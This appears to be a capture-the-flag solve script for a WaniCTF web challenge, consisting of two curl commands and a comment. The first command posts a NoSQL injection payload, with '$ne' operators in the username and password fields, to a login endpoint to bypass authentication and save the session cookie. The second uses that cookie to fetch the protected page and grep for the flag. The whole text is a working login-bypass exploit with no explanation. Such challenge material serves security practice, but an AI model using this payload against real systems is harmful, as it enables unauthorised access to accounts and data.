curl 'https://nosql.web.wanictf.org/login' \
-X POST -H "Content-Type: application/json" \
-d '{"username" : {"$ne": 1}, "password": {"$ne": 1}}' -c my.cookie;
curl 'https://nosql.web.wanictf.org/' -b my.cookie

# ./solve.sh | grep FLAG
